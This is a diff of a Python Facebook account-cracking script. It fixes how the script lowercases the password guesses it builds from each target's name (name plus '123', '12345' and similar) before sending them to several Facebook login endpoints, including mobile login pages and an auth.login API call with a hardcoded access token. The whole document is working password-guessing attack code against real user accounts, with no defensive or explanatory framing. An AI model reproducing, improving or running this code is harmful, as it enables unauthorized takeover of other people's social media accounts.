@@ -342,12 +342,10 @@ def ___metode___():
                 ox = Name.split(' ')
                 if ___password___ in ['1','01']:
                     pwx = [Name, ox[0]+'121', ox[0]+'123'+ox[0]+'12345', ox[0]+'123456',ox[0]+'1234567',ox[0]+'12345678']
-                    pwx = pwx.lower()
                 elif ___password___ in ['2','02']:
                     pwx = pwd
                 else:
                     pwx = [Name, ox[0]+'121', ox[0]+'123'+ox[0]+'12345', ox[0]+'123456',ox[0]+'1234567',ox[0]+'12345678']
-                    pwx = pwx.lower()
                 hayuk.submit(mbasic, ids, uid, pwx)
         os.remove(___file___)
         exit("\n%s[%sDone%s]"%(B,H,P))
@@ -374,12 +372,10 @@ def ___metode___():
                 ox = Name.split(' ')
                 if ___password___ in ['1','01']:
                     pwx = [Name, ox[0]+'121', ox[0]+'123'+ox[0]+'12345', ox[0]+'123456',ox[0]+'1234567',ox[0]+'12345678']
-                    pwx = pwx.lower()
                 elif ___password___ in ['2','02']:
                     pwx = pwd
                 else:
                     pwx = [Name, ox[0]+'121', ox[0]+'123'+ox[0]+'12345', ox[0]+'123456',ox[0]+'1234567',ox[0]+'12345678']
-                    pwx = pwx.lower()
                 hayuk.submit(free, ids, uid, pwx)
         os.remove(___file___)
         exit("\n%s[%sDone%s]"%(B,H,B))
@@ -412,12 +408,10 @@ def ___metode___():
                 ox = Name.split(' ')
                 if ___password___ in ['1','01']:
                     pwx = [Name, ox[0]+'121', ox[0]+'123'+ox[0]+'12345', ox[0]+'123456',ox[0]+'1234567',ox[0]+'12345678']
-                    pwx = pwx.lower()
                 elif ___password___ in ['2','02']:
                     pwx = pwd
                 else:
                     pwx = [Name, ox[0]+'121', ox[0]+'123'+ox[0]+'12345', ox[0]+'123456',ox[0]+'1234567',ox[0]+'12345678']
-                    pwx = pwx.lower()
                 hayuk.submit(mbasic, ids, uid, pwx)
         os.remove(___file___)
         exit("\n%s[%sDone%s]"%(B,H,P))
@@ -444,12 +438,10 @@ def ___metode___():
                 ox = Name.split(' ')
                 if ___password___ in ['1','01']:
                     pwx = [Name, ox[0]+'121', ox[0]+'123'+ox[0]+'12345', ox[0]+'123456',ox[0]+'1234567',ox[0]+'12345678']
-                    pwx = pwx.lower()
                 elif ___password___ in ['2','02']:
                     pwx = pwd
                 else:
                     pwx = [Name, ox[0]+'121', ox[0]+'123'+ox[0]+'12345', ox[0]+'123456',ox[0]+'1234567',ox[0]+'12345678']
-                    pwx = pwx.lower()
                 hayuk.submit(mbasic, ids, uid, pwx)
         os.remove(___file___)
         exit("\n%s[%sDone%s]"%(B,H,P))
@@ -476,12 +468,10 @@ def ___metode___():
                 ox = Name.split(' ')
                 if ___password___ in ['1','01']:
                     pwx = [Name, ox[0]+'121', ox[0]+'123'+ox[0]+'12345', ox[0]+'123456',ox[0]+'1234567',ox[0]+'12345678']
-                    pwx = pwx.lower()
                 elif ___password___ in ['2','02']:
                     pwx = pwd
                 else:
                     pwx = [Name, ox[0]+'121', ox[0]+'123'+ox[0]+'12345', ox[0]+'123456',ox[0]+'1234567',ox[0]+'12345678']
-                    pwx = pwx.lower()
                 hayuk.submit(mbasic, ids, uid, pwx)
         os.remove(___file___)
         exit("\n%s[%sDone%s]"%(B,H,P))
@@ -508,12 +498,10 @@ def ___metode___():
                 ox = Name.split(' ')
                 if ___password___ in ['1','01']:
                     pwx = [Name, ox[0]+'121', ox[0]+'123'+ox[0]+'12345', ox[0]+'123456',ox[0]+'1234567',ox[0]+'12345678']
-                    pwx = pwx.lower()
                 elif ___password___ in ['2','02']:
                     pwx = pwd
                 else:
                     pwx = [Name, ox[0]+'121', ox[0]+'123'+ox[0]+'12345', ox[0]+'123456',ox[0]+'1234567',ox[0]+'12345678']
-                    pwx = pwx.lower()
                 hayuk.submit(mbasic, ids, uid, pwx)
         os.remove(___file___)
         exit("\n%s[%sDone%s]"%(B,H,P))
@@ -527,6 +515,7 @@ def mbasic(ids, uid, pwx, **kwargs):
     ); sys.stdout.flush()
     try:
         for pw in pwx:
+            pw = pw.lower()
             ses = requests.Session()
             ses.headers.update({"origin": "https://mbasic.facebook.com", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "mbasic.facebook.com", "referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
             p = ses.get("https://mbasic.facebook.com/login/?next&ref=dbl&refid=8").text
@@ -564,6 +553,7 @@ def free(ids, uid, pwx, **kwargs):
     ); sys.stdout.flush()
     try:
         for pw in pwx:
+            pw = pw.lower()
             ses = requests.Session()
             ses.headers.update({"origin": "https://free.facebook.com", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "free.facebook.com", "referer": "https://free.facebook.com/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
             p = ses.get("https://free.facebook.com/login/?next&ref=dbl&refid=8").text
@@ -601,6 +591,7 @@ def mobile(ids, uid, pwx, **kwargs):
     ); sys.stdout.flush()
     try:
         for pw in pwx:
+            pw = pw.lower()
             ses = requests.Session()
             ses.headers.update({"origin": "https://m.facebook.com", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "m.facebook.com", "referer": "https://m.facebook.com/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
             p = ses.get("https://m.facebook.com/login/?next&ref=dbl&refid=8").text
@@ -638,6 +629,7 @@ def crack(ids, uid, pwx, **kwargs):
     ); sys.stdout.flush()
     try:
         for pw in pwx:
+            pw = pw.lower()
             ses = requests.Session()
             ses.headers.update({"origin": "https://d.facebook.com", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "d.facebook.com", "referer": "https://d.facebook.com/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
             p = ses.get("https://d.facebook.com/login/?next&ref=dbl&refid=8").text
@@ -675,6 +667,7 @@ def api(ids, uid, pwx):
     ); sys.stdout.flush()
     try:
         for pw in pwx:
+            pw = pw.lower()
             ses = requests.Session()
             headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': ua, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
             send = ses.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + str(uid) + '&password=' + str(pw) + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=headers_)
@@ -701,6 +694,7 @@ def crack2(ids, uid, pwx, **kwargs):
     ); sys.stdout.flush()
     try:
         for pw in pwx:
+            pw = pw.lower()
             ses = requests.Session()
             ses.headers.update({"origin": "https://x.facebook.com", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "x.facebook.com", "referer": "https://x.facebook.com/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
             p = ses.get("https://x.facebook.com/login/?next&ref=dbl&refid=8").text
